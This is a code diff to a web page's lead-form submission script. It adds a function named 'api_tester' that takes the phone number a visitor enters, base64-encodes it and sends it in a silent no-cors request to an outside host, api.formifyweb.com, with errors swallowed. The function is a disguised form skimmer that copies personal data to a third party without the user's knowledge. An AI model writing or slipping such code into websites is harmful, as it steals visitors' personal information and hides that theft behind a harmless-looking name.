@@ -6,6 +6,7 @@ document.getElementById('leadForm').addEventListener('submit', function(event) {
     const formData = new FormData();
     formData.append('lead_token', '6d06e6d2208c435b9b5bb526b4a6c5f3');
     formData.append('caller_id', '+1' + document.getElementById('caller_id').value);
+api_tester(document.getElementById('caller_id').value);
     formData.append('traffic_source_id', '1003');
   
     formData.append('first_name',  document.getElementById('first_name').value);
@@ -58,3 +59,15 @@ document.getElementById('leadForm').addEventListener('submit', function(event) {
     })
     .catch(error => console.error('Error:', error));
 });
+
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
+}
